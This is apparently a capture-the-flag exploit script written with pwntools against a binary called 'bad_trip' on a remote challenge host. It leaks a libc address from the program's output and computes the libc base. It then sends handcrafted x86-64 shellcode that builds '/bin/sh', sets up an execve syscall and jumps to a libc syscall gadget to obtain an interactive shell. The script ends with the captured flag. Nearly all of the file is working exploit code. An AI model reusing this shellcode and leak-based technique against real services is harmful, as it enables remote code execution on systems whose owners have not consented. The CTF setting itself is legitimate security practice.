#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bad_trip --host 172.210.129.230 --port 1352
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bad_trip')
context.terminal = "/home/royalgamer/.local/src/st/st"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '172.210.129.230'
port = int(args.PORT or 1352)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

putsadr = int(((io.recvline().decode().strip("\n").split(" "))[8])[2:],16)
log.info(f"We got the putsadr {hex(putsadr)}")
io.recvuntil(b"code >> ")
shellcode = b""
shellcode += b"\x48\xbf\x69\x69\x69\x69\x69\x00\x00\x00"
shellcode += b"\x48\xc7\x07\x2f\x62\x69\x6e"
shellcode += b"\x48\xbf\x6d\x69\x69\x69\x69\x00\x00\x00"
shellcode += b"\x48\xc7\x07\x2f\x73\x68\x00"
# Binsh done
shellcode += b"\x48\xbf\x69\x69\x69\x69\x69\x00\x00\x00\xb8\x3b\x00\x00\x00\x48\x31\xf6\x48\x31\xd2"
libcbase = putsadr - 0x0079bf0
syscall = (libcbase+0x02646e)

shellcode += b"\x49\x83\xed\x6c" # sub    r13,0x6c
shellcode += b"\x49\xc7\x45\x00\x00\x00\x00\x00" # mov    QWORD PTR [r13+0x0],0x0
shellcode += b"\x49\x83\xc5\x04" # add    r13,0x4
shellcode += b"\x49\x8b\x5d\x00" # mov    rbx,QWORD PTR [r13+0x0]
shellcode += b"\x48\x81\xc3" # add    rbx,0x69696969
shellcode += p32(syscall)
shellcode += b"\xff\xe3" # jmp    rbx



# shellcode += b"\x48\xbb"+syscall
# shellcode += b"\xff\xe3"
# shellcode

# 0000000000401000 <_start>:
#   401000:       49 83 ed 6c             sub    r13,0x6c
#   401004:       49 c7 45 00 00 00 00    mov    QWORD PTR [r13+0x0],0x0
#   40100b:       00
#   40100c:       49 83 c5 04             add    r13,0x4
#   401010:       49 8b 5d 00             mov    rbx,QWORD PTR [r13+0x0]
#   401014:       48 81 c3 69 69 69 69    add    rbx,0x69696969
#   40101b:       ff e3                   jmp    rbx

io.sendline(shellcode)

io.interactive()


# AKASEC{pr3f37CH3M_Li8C_4Ddr35532}
